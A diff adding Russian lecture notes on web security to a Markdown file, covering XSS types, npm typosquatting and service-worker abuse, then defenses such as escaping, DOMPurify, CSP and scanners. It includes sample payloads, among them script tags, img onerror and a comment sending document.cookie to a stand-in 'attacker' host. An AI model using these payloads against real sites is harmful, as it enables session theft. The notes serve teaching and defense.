@@ -1285,3 +1285,245 @@ db -> github (md)
 `We need JAM stack!`
 
 ---
+
+## Безопасность: уязвимости вашего приложения
+
+[https://www.youtube.com/watch?v=2gthjl2Lks4&list=PL8sJahqnzh8LOnV0s72DBt0OFBqdv9I9Y&index=3](https://www.youtube.com/watch?v=2gthjl2Lks4&list=PL8sJahqnzh8LOnV0s72DBt0OFBqdv9I9Y&index=3)
+
+### XSS (Cross Site Scripting)
+
+#### Reflected XSS (активный)
+
+Кидают ссылку
+
+`http://forum.by?search`=news<\script%20src="http://hackersite.com/stealer.js
+
+(spam - social networks, short links, qr codes)
+
+Больше социальная инженирия
+
+#### Persistent XSS (пасивный)
+
+Оставляют комментарий вида
+
+```html
+<html>
+  <script>
+    window.location = "http://attacker/?cookie" + document.cookie;
+  </script>
+</html>
+```
+
+Нужно более грубокое знание работы сайтов.
+Как рендерится страница, как работает скрипт
+
+Находим уезвимости сайта -> выполням скрипт -> готово
+
+#### Dom-based XSS
+
+<input value="userInput">
+
+добавим в инпут`"><script>...</script>` - готово
+получим
+<input value="`"><script>...</script>`
+
+Или (сложнее)
+
+добавим в инпут `"><iframe SRC="javascript:alert('XSS')"></iframe>`
+получим
+<input value=""><iframe SRC="javascript:alert('XSS')"></iframe>
+
+Или с картинкой
+
+добавим в инпут `"><img src=i onerror=alert('xss')>`
+получим
+<input value=""><img src=i onerror=alert('xss')>
+
+Или заенкодить скрипт
+<IMG SRC=&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;>
+
+Или так
+<IMG SRC=&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000041>
+
+JS BUG
+
+#### Что можно (обычно) воровать?
+
+Cookie (ls, ss)
+Keylogging (passwords)
+Phishing (fake forms)
+Mining
+
+#### Кто должен нас спастись?
+
+frameworks (react, angular, vue)
+
+AngularJS
+usemap (поправлено после 1.5)
+
+Vue.js (v-html)
+не помогает - сам разработчик должен отслеживать! Оо
+
+React | Angular
+Уязвимости в node_modules
+
+Уязвимости Redux
+SSR
+
+```js
+<script>
+  const state = ${JSON.stringify(preloadedState)}
+  window.__PRELOADED_STATE__= state;
+</script>
+```
+
+Если удаться зарегистрироваться с именем
+
+```json
+{
+  "user": "Alex</script><script>alert('XSS!')</script>"
+}
+```
+
+Будет серверный пре-рендеринг и выполняется скрипт злоумышленника
+
+```js
+<script>
+  const state = "{"user":"Alex
+  </script>
+ <script>alert(\"XSS!\")</script>
+ ...
+ </script>
+```
+
+#### Старые сайты и использую уязвимости
+
+#### Похожие названия пакетов npm
+
+- FAKE
+  ORIGINAL
+
+- babelcli
+  babel-cli
+- jquery.js
+  jquery
+- mongose
+  mongoose
+- gruntcli
+  grunt-cli
+- D3.js
+  D3
+
+в post-install будут украденны переменные среды (env)
+
+#### DATA IS ENEMY
+
+#### NPM IS ENEMY
+
+#### SSR IS ENEMY
+
+#### PROGRESS IS ENEMY
+
+#### SPA IS ENEMY
+
+#### CACHE IS ENEMY (PWA)
+
+#### SW IS ENEMY
+
+В gif может быть зашит SW (WAT???)
+
+ForeignFetch
+
+```json
+'Content-Type': "image/gif"
+'Origin-Trial': 'AgIMasf+ffwrS9'
+'Link': '</sw.js>; rel="serviceworker";'
+```
+
+Для майнинга (3 версии хрома работало)
+
+#### EXTENSION IS ENEMY
+
+(ublock, abp, ghost)
+
+XV - XML Viewer
+Отслеживает все!
+
+### Как бороться?
+
+Detect Extensions
+
+chrome-extension://{extension ID}/resource
+
+манифест
+{extension ID = sfasgdgsdgds...}/
+
+{web_accessible_resources = adblock.custom.css}
+
+Никогда не вставляйте код от пользователь (скрипты, комменты, тэги, аттрибуты, стили)
+
+или сделать проверку перед добавлением
+
+- & --> &amp;
+- < --> &lt;
+- > --> &gt;
+- " --> &quot;
+- ' --> &#x27;
+
+и sanitize HTML
+use library js-xss or DOMPurify of serialize-javascript
+
+CSP
+Content-Security-Policy: script-src https://example.net
+Грузит только с 1 домена
+
+CSP nonce
+Content-Security-Policy: script-src 'nonce-Xsafasvesaf'
+
+CSP hash
+Content-Security-Policy: script-src 'sha256=safasfsaf'
+
+CSP report
+Content-Security-Policy: report-uri https://ex.com/csp/report
+
+Other headers
+
+- httpOnly
+- X-XSS-Protection
+- X-Frame-Options
+- X-Content-Type-Options
+- X-Webkit-CSP
+- others
+
+#### tools
+
+Динамическая проверка
+Tools for Jenkins
+
+Owasp ZAP + ZAP Plugin + Any Report Plugin
+
+Arachni + Text Finder Plugin + Any Report Plugin
+
+Статическая проверка
+ESLint + securyti plugin
+
+NSP
+run npm install nsp
+run nsp check
+
+or
+
+Snyk (больше находит и втроен в lighthouse и github)
+run npm install snyk
+run snyk test
+
+### Summary
+
+- Не полагайтесь на фреймворки
+- Заботьтесь о пользователях
+- Смотрите на node_modules
+- Используйте Content-Security-Policy
+- Используйти тулы для динамического анализа
+- Используйти тулы для статического анализа
+
+---
